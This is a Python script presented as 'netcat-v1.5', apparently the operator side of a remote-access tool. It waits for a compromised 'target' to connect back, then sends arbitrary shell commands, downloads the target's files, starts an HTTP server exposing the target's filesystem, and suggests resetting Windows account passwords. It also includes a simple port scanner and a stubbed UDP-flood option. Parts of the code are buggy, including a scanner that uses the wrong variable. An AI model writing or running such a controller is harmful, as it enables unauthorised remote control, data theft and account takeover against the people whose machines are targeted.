#!/usr/bin/python
#-*-coding:utf8;-*-

from urllib.request import urlretrieve
import socketserver
import http.server
import subprocess
import threading
import argparse
import random
import socket
import tqdm
import time
import sys
import os

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def clear():
    os.system("clear")


help = YELLOW + """\n\t\t-------------- Help ------------------\n
    Commands\t\tUse\t\t\t\tExample"""+END+GREEN+"""
    l-host\t\tlocal-host <command>\t\tl-host ls
    download\t\tdownload <file name>\t\tdownload music.mp4
    server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468
    target-ip\t\ttarget-ip             \t\tit shows the target ip
    output_save\t\toutput_save <True|False>\toutput_seve True or output_save False

    help\t\tit shows this help message

    if you on windows you can reset the password by typing as follows
    net user <user name> <new password> example: net user omer password123

    For more information type the name of the command follow by -h or --help
    """ + END
def HELP():
    print("""
------------------------------------------help---------------------------------------------
[+] netcat-v1.5.py [Options]
[+] netcat-v1.5.py [[-h,--help,help] , [-d,--download] , [-s,--port-scan] , [-l,--listen] , [--udp-flood]]
[+] Options:
        -h,--help,help   : it print this help message
        -d.--download    : it used to download files from the given url
        -s,--port-scan   : it used to scan the given host for an open Port
        -l,--listen      : it used to liston for target to connect
        --udp-flood      : it used to attack the given host and other by providing the IP
""")

def run_server(dir_name):
    try:
        os.chdir(dir_name)
        IP   = socket.gethostname()
        PORT = 8080
        #creating request handler with variable name handler
        handler = http.server.SimpleHTTPRequestHandler
        #binding the request with the ip and port as httpd
        with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
            messeage = YELLOW+"[+] Server started at  -> "+IP+":"+str(PORT)+END
            print(messeage)
            #running the server
            httpd.serve_forever()
    except Exception as e:
        print(e)

def download(url):
    try:
        _save_as = input("[+] Enter file name to save it as: ")
        if _save_as == "" or _save_as == " "*len(_save_as):
            print("[!] Please provid a file name!!")
        else:
            #os.system("clear")
            urlretrieve(url,_save_as)
    except Exception as e:
        print(e)

def port_scan(_host):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    for port in range(1,100):
        try:
            s.connect((host,port))
            print(f"[+] Found open port at {_host}:{port}")
        except:
            print(f"[-] port is close {port}")

def emo():
    emots = ["☆","♤",
             "♡","◇",
             "♧","¤",
             "@","■"
            ]
    emot  = random.choice(emots)
    return emot

def Help(com):

    if com == "l-host":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("l-host      \t\tl-host <command> : Executing command on localhost or current hosting machine")
        print("""
l-host <commands>     : used to execute command on the local-host
                        example : l-host pwd
                                  l-host ls""")

    elif com == "download":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("download\t\tsend <file name> : download file to the host")
        print(""""
download <file_name>  : used to download file,mid,app and other from the target
                         example : download video.mp4
                                   download music.mp3
                                   download dir_name2/dir_name2/music.mp3""")

    elif com == "server":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("server      \t\tserver <IP:PORT> ")
        print("""
server <host:port>    : used to run http server on the target to access target file throughout browser
                     example  : server 127.0.0.1:55555
                     note that: it only recommend on the same network""")

    elif com[:9] == "target-ip":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("target-ip\t\ttarget_ip")
        print("""
target-ip <optional_command>: used to return the target ip
                    example : target-ip
                              target-ip help : help is the only optional command available""")
    elif com == "output_save":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("output_save\t\toutput_save <True|False>")
        print("""
output_save <True|False>    : used to save the received output command to default file name or
                              you can just changed the file name
                    example : output_seve True  : start saving
                              output_seve False : stop saving""")
    else:
        print(help)

def LocalHost(com):
    print(YELLOW+"\n\n\n"+"-"*50+END)
    print(GREEN+"[.......BEGINNING EXECUTING COMMAND ON LOCALHOST.......]"+END)
    print(YELLOW, "-"*50,END, "\n")

    if com[:2] == "cd":
        try:
            os.chdir(com[3:])
        except Exception as e:
            print(e)

    elif com[:2] == "ls":
        com = ("ls --color" + com[3:])
        os.system(com)

    else:
        os.system(com)
    print(YELLOW+"\n"+"-"*50+END)
    print(GREEN+"[...................END OF EXECUTING...................]"+END)
    print(YELLOW,"-"*50,END, "\n\n\n")

def recive(c,_port):

    print(_port)

    mp = 131537871
    _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(MAGENTA+"[+] START_DAWNLOADING..."+END)

    try:
        _s.bind((host,_port))
        _s.listen(5)
        (_conn,_addr) = _s.accept()
    except:
        pass
    file_size = int(_conn.recv(1024).decode("utf-8"))
    _size = (125.44*file_size)/mp
    print("file name: ",c,"file size: ",_size,"MB")
    with open(c,"wb") as file:
        #The time when the data start recving
        start_time = time.time()
        progress = tqdm.tqdm(unit="B", unit_scale=True, unit_divisor=1024,total=file_size)
        while True:
            data = _conn.recv(1024)
            if not(data):
                progress.update(1024)
                #time.sleep(1)
                break
            progress.update(1024)
            file.write(data)

            #The time when the data stop recving
        progress.update(1024)
        end_time = time.time()
        print("\nFile dwonload successfully in ",float(end_time - start_time),"seconds")
        _conn.close()
        _s.close()

def main(port,_port):
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    seve_to_file = False
    default_fname = "save_out_put.txt"

    try:
        s.bind((host,port))

        print(GREEN+"[WAITING FOR THE CONNECTION...]"+END)
        s.listen(5)

        (conn,addr) = s.accept()
        pwd = conn.recv(1024).decode("utf-8")
        clear()
    #print(YELLOW+"\t\t\t[TARGET ADDRS = "+END+GREEN+addr[0]+"]"+END)

    except Exception as e:
        print(RED,"[!][!] ",e,END)
        exit()

    except KeyboardInterrupt:
        clear()
        print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite...")
        try:
            input("[Peres_Enter_To_Exit...]"+END)
            clear()
            s.close()
            exit(0)
        except KeyboardInterrupt:
              print(YELLOW+"[-] stupid can't escape this reality"+END)
              s.close()
              exit()
              pass

    while True:


        try:
            emot = emo()
            com = input(BLUE+"<●"+END+GREEN+"["+END+YELLOW+"Net-Cat"+END+GREEN+"]"+END+BLUE+emot+END+GREEN+"["+END+MAGENTA+pwd+END+GREEN+"]"+END+BLUE+"> "+END+GREEN+"\n\t   └─$ ")
            """help me"""+END
            if com[:8]=="download":

                if len(com) == 8:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
                elif com[9:] == "-h" or com[9:] == "--help":
                    Help(com[:8])
                else:
                    conn.send(str.encode(com))
                    c = com[9:]
                    recive(c,_port)

            elif com[:6] == "l-host":

                if len(com) == 6:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)

                elif com[7:] == "-h" or com[7:] == "--help":
                    Help(com[:6])
                else:
                    com = com[7:]
                    LocalHost(com)
            elif com[:9] == "target-ip":
                if len(com) == 9:
                    print(GREEN,"[+] [TARGET]",END,YELLOW, " target ip = {}".format(addr[0]),END )
                else:
                    if com[10:] == "help" or com[10:] == "-h" or com[10:] == "--help":
                        Help(com[:9])
                    else:
                        print(RED+"[!] Invalid commands!!\n"+END,GREEN+"[Try] : target-ip help, -h or --help"+END)
            elif com[:11] == "output_save":
                if len(com) == 11:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
                elif com[12:] == "-h" or com[12:] == "--help":
                    Help(com[:11])
                elif com[12:] == "True" or com[12:] == "true":
                    seve_to_file = True
                    new_fname = input("[+] Enter file name"+YELLOW+"(Default : {}): ".format(default_fname)+END)
                    if len(new_fname) != 0:
                        if new_fname == (" " * len(new_fname)):
                            print(YELLOW, "[+] Please Enter Valid Name ",END)
                            seve_to_file = False
                        else:
                            default_fname = new_fname
                elif com[12:] == "False" or com[12:] == "false":
                    seve_to_file = False
            elif com == "help":
                Help(com)

            elif com[:6] == "server":
                if len(com) == 6:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
                elif com[7:] == "-h" or com[7:] == "--help":
                    Help(com[:6])
                else:
                    if ":" in com:
                        conn.send(str.encode(com))
                    else:
                        print(RED+"Invalid addres!!"+END)

            else:

                if com == "" or com == (" " * len(com)):
                    com = "echo '[!][!] cannot execute empty commands :p'"

                conn.send(str.encode(com))

                if com == "exit" or com == "quite":
                    try:
                        input(RED+"[Peres_Enter_To_Exit...]"+END)
                        print(MAGENTA+"[EXITING... Good Bay...]"+END)
                        conn.send(str.encode(com))
                        break
                    except KeyboardInterrupt:
                        print(YELLOW+"[-] stupid can't escape this reality"+END)
                        break
                # maximum recive data 99999999B = 953.6743154526MB
                m = str(conn.recv(999999999),"utf-8")
                if "-pwd@-" in m:
                    pwd = m[6:]
                    m = GREEN+"[+]  successfully moved to : " + m[6:] +END
                print(m)
                if seve_to_file:
                    with open("input.txt","w") as f0:
                        f0.write(m)
                    with open("input.txt","r") as f,\
                            open(default_fname,"a") as f2:
                                f2.write("<● [Netcat]-[{}]>{}\n".format(pwd,com))
                                for word in f.readlines():
                                     if "." in word:
                                        if "[" in word:
                                            f2.write("\t\t"+word[7:-4]+"[directory]\n")
                                        else:
                                            f2.write("\t\t"+word)
                                     else:
                                        if "[" in word:
                                            f2.write("\t\t/"+word[7:-4]+"[directory]\n")
                                        else:
                                            f2.write("\t\t/"+word)
                    os.system("rm -r input.txt")

        except Exception as e:
            print(e)

        except KeyboardInterrupt:
            clear()
            print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite..."+END)
            try:
                input(MAGENTA+"[Peres_Enter_To_Continuse...]"+END)
                clear()
                pass
            except  KeyboardInterrupt:
                print(YELLOW+"[-] stupid can't escape this reality"+END)
                pass

    conn.close()
    s.close()

if __name__ == "__main__":
    global host
    global port

    host = ""
    port = 55555
    try:

        if sys.argv[1] == "-h" or sys.argv[1] == "--help" or sys.argv[1] == "help":
            HELP()
        
        elif sys.argv[1] == "--download" or sys.argv[1] == "-d":
            try:
                if sys.argv[2] == " "*len(sys.argv[2]):
                    print("[!] Please Enter Valid url.\n[+] Try -d https://www.example-web.com/sample.pdf or\n--download https://www.example-web.com/sample.pdf")
                else:
                    download(sys.argv[2])
            except:
                print("[+] Try -d https://www.example-web.com/sample.pdf or\n--download https://www.example-web.com/sample.pdf")

        elif sys.argv[1] == "--port-scan" or sys.argv[1] == "-s":
            try:
                port_scan(sys.argv[2])
            except:
                print(sys.argv[2])
                print("[+] Try: -s 127.0.0.1 or --port-scan 127.0.0.1 [-s,--port-scan <host>]")

        elif sys.argv[1] == "--udp-flood":
            try:
                print("out of bisness")
            except Exception as e:
                print("[+] try: --udp-flood 142.250.181.164 or --udp-flood www.google.com [--udp-flood <host>]\n--udp-flood 127.0.0.1,142.250.181.164,8.8.8.8 no space bettwen the host and the coma(,)",e)
            
        elif sys.argv[1] == "--listen" or sys.argv[1] == "-l":
            print("iam in")
            try:
                port  = int(sys.argv[2])
                _port = port - 1
                print("[+] listening on port number {}".format(port))
                main(port,_port)
            except:
                _port = port - 1
                main(port,_port)
        elif sys.argv[1] == "-ss" or sys.argv[1] == "--server":
            try:
                run_server(sys.argv[2])
            except:
                print("[+] Try: -ss dir_name1/dir_name2 or --server dir_name1/dir_name2 [-ss,--server <path of the folder>")
        
    except:
        HELP()
